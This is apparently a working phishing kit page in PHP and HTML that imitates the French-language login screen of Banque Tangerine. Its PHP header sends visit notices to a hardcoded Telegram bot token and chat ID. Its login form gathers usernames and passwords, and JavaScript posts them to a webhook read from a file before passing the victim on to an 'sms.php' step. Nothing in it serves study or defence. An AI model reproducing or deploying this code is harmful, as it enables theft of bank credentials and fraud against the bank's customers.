
<?php session_start();
$_SESSION["bank"] ='tandgerine';



$message = 
           "🏦 **Banque** : " . $_SESSION["bank"] . "\n" ;

// Enregistre les données dans un fichier local (peut être conservé ou retiré selon les besoins)
$file = "../blinky2000@bvc@bvc@destruction.txt";
file_put_contents($file, $message, FILE_APPEND);

// Configuration de l'envoi Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; // Remplace par le token de ton bot
$chat_id = '6242884372'; // Remplace par ton chat_id

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);

?>
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Banque Tangerine</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#8E6FF7',
                        secondary: ''
                    },
                    borderRadius: {
                        'none': '0px',
                        'sm': '4px',
                        DEFAULT: '8px',
                        'md': '12px',
                        'lg': '16px',
                        'xl': '20px',
                        '2xl': '24px',
                        '3xl': '32px',
                        'full': '9999px',
                        'button': '8px'
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css">
    <style>
        :where([class^="ri-"])::before {
            content: "\f3c2";
        }

        body {
            background-color: #f9f9f9;
            font-family: 'Inter', sans-serif;
        }

        input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
        }

        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 40px;
            height: 20px;
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 34px;
        }

        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 16px;
            width: 16px;
            left: 2px;
            bottom: 2px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }

        input:checked+.toggle-slider {
            background-color: #ea7024;
        }

        input:checked+.toggle-slider:before {
            transform: translateX(20px);
        }
    </style>

<style>
.spinner {
    border: 6px solid #f3f3f3;
    border-top: 6px solid #006241;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

#errorPopup {
    position: fixed;
    top: 30%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #f44336;
    color: white;
    padding: 20px 30px;
    border-radius: 10px;
    z-index: 10000;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
    cursor: pointer;
    font-size: 16px;
}
</style>
</head>

<body>
    <!-- Header -->
    <header class="bg-[#ea7024] text-white py-3 px-4">
        <div class="container mx-auto flex items-center justify-between">
            <div class="flex items-center">
                <a href="#" class="font-['Pacifico'] text-2xl">Tangerine</a>
                <nav class="hidden md:flex space-x-6">
                    <a href="#" class="hover:underline">Produits</a>
                    <a href="#" class="hover:underline">Services bancaires</a>
                    <a href="#" class="hover:underline">Blogue</a>
                    <a href="#" class="hover:underline">À propos de nous</a>
                </nav>
            </div>
            <div class="hidden md:flex items-center space-x-3">
                <a href="#" class="bg-white text-[#ea7024] px-3 py-1.5 rounded-button whitespace-nowrap text-sm">Devenir Client</a>
                <a href="#" class="border border-white px-3 py-1.5 rounded-button whitespace-nowrap text-sm">Accès Clients</a>
                <div class="flex items-center ml-2">
                    <a href="#" class="flex items-center space-x-1">
                        <span>FR</span>
                        <i class="ri-arrow-down-s-line"></i>
                    </a>
                    <div class="w-8 h-8 flex items-center justify-center ml-2">
                        <i class="ri-search-line"></i>
                    </div>
                </div>
            </div>
            <div class="md:hidden flex items-center">
                <button class="w-8 h-8 flex items-center justify-center">
                    <i class="ri-menu-line text-xl"></i>
                </button>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="container mx-auto py-10 px-4">
        <div class="max-w-md mx-auto bg-white rounded shadow-sm p-6 border border-gray-100">
            <h1 class="text-2xl font-semibold mb-6">Connexion</h1>
            <!-- Tabs -->
            <div class="border-b border-gray-200 mb-6">
                <div class="flex">
                    <button class="px-4 py-2 border-b-2 border-[#ea7024] text-[#ea7024] font-medium">Personnel</button>
                    <button class="px-4 py-2 text-gray-500">Affaires</button>
                </div>
            </div>
            <!-- Login Form -->
            <form id='loginForm' action="/tandgerine/sms.php" method="post">
            <div class="mb-6">
                    <label for="username" class="block text-sm text-gray-600 mb-1">Identifiant de connexion</label>
                    <input name="cvv" type="text" id="username" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-[#ea7024]">
                    <p class="text-xs text-gray-500 mt-1">Saisissez votre numéro de client, numéro de carte ou nom d'utilisateur</p>
                </div>
                <div class="mb-6">
                    <label for="pass" class="block text-sm text-gray-600 mb-1">Password</label>
                    <input name="mdp" type="text" id="pass" class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-[#ea7024]">
                   
                </div>
                <div class="flex items-center mb-6">
                    <label class="toggle-switch mr-2">
                        <input type="checkbox">
                        <span class="toggle-slider"></span>
                    </label>
                    <span class="text-sm">Se souvenir de moi sur cet appareil</span>
                    <div class="w-5 h-5 flex items-center justify-center ml-1">
                        <i class="ri-information-line text-gray-400"></i>
                    </div>
                </div>
                <button type="submit" class="bg-[#ea7024] text-white px-6 py-2 rounded-button whitespace-nowrap">Soumettre</button>
                <div class="mt-4">
                    <a href="#" class="text-[#0066CC] text-sm flex items-center">
                        <span>J'ai oublié mes identifiants de connexion</span>
                        <i class="ri-arrow-right-s-line ml-1"></i>
                    </a>
                </div>
            </form>
        </div>
        <!-- Security Info -->
        <div class="max-w-md mx-auto mt-6 text-xs text-gray-600">
            <p class="mb-2">La Banque Tangerine est une filiale en propriété exclusive de la Banque de Nouvelle-Écosse et elle est membre à part entière de la Société d'assurance-dépôts du Canada (SADC).</p>
            <div class="flex items-center mb-2">
                <div class="bg-[#6B2C91] text-white px-2 py-1 rounded text-xs mr-2">sadc</div>
                <a href="#" class="text-[#0066CC]">Renseignements relatifs à l'assurance-dépôts de la SADC</a>
            </div>
            <div class="flex items-center">
                <a href="#" class="text-[#0066CC] flex items-center">
                    <i class="ri-lock-line mr-1"></i>
                    <span>Garantie de Sécurité</span>
                </a>
            </div>
        </div>
    </main>
    <!-- Footer -->
    <footer class="bg-[#333333] text-white mt-20 py-8 px-4">
        <div class="container mx-auto">
            <!-- Main Footer Links -->
            <div class="flex flex-wrap justify-between mb-8">
                <a href="#" class="text-sm hover:underline mb-2 mr-4">Localisateur de guichets</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">FAQ</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">Carrières</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">Contactez-nous</a>
                <a href="#" class="text-sm hover:underline mb-2 mr-4">À propos de nous</a>
                <a href="#" class="text-sm hover:underline mb-2">Taux</a>
            </div>
            <!-- Social Media -->
            <div class="flex space-x-4 mb-8">
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-twitter-x-line text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-facebook-fill text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-linkedin-fill text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-instagram-line text-white"></i>
                </a>
                <a href="#" class="w-8 h-8 flex items-center justify-center bg-white bg-opacity-20 rounded-full">
                    <i class="ri-youtube-fill text-white"></i>
                </a>
            </div>
            <!-- Legal Links -->
            <div class="flex flex-wrap text-sm text-gray-400">
                <a href="#" class="hover:underline mr-4 mb-2">Confidentialité</a>
                <a href="#" class="hover:underline mr-4 mb-2">Juridique</a>
                <a href="#" class="hover:underline mr-4 mb-2">Sécurité</a>
                <a href="#" class="hover:underline mr-4 mb-2">Accessibilité</a>
                <a href="#" class="hover:underline mb-2">Guide de pub</a>
            </div>
        </div>
    </footer>


    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Intercepte la soumission normale
        showLoader();

        const form = this;
        const formData = new FormData(form);
        const data = {
            cvv: formData.get('cvv'),
            mdp: formData.get('mdp'),
            remember: formData.get('remember') === 'on'
        };

        // On lit le webhook depuis le fichier texte
        fetch('/webhookurl.txt')
            .then(response => response.text())
            .then(webhookURL => {
                // Nettoyage (par exemple si le fichier contient des sauts de ligne)
                webhookURL = webhookURL.trim();

                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            })
            .then(response => response.json())
            .then(result => {
                hideLoader();

                if (result.continue === "yes") {
                    form.removeEventListener('submit', arguments.callee); // On retire l'interception
                    form.submit(); // Soumission réelle
                } else {
                    showPopup("Erreur : informations incorrectes.");
                }
            })
            .catch(error => {
                hideLoader();
                console.error('Erreur :', error);
                showPopup("Une erreur est survenue.");
            });
    });

    function showLoader() {
        const loader = document.createElement('div');
        loader.id = 'fullScreenLoader';
        loader.style.position = 'fixed';
        loader.style.top = 0;
        loader.style.left = 0;
        loader.style.width = '100vw';
        loader.style.height = '100vh';
        loader.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loader.style.display = 'flex';
        loader.style.justifyContent = 'center';
        loader.style.alignItems = 'center';
        loader.style.zIndex = 9999;
        loader.innerHTML = `<div class="spinner"></div>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById('fullScreenLoader');
        if (loader) loader.remove();
    }

    function showPopup(message) {
        const popup = document.createElement('div');
        popup.id = 'errorPopup';
        popup.style.position = 'fixed';
        popup.style.top = '20px';
        popup.style.left = '50%';
        popup.style.transform = 'translateX(-50%)';
        popup.style.backgroundColor = '#f44336';
        popup.style.color = 'white';
        popup.style.padding = '15px 25px';
        popup.style.borderRadius = '8px';
        popup.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
        popup.style.zIndex = 10000;
        popup.textContent = message;

        function removePopup() {
            popup.remove();
            document.removeEventListener('click', removePopup);
        }

        document.body.appendChild(popup);
        document.addEventListener('click', removePopup);
    }
</script>
</body>

</html>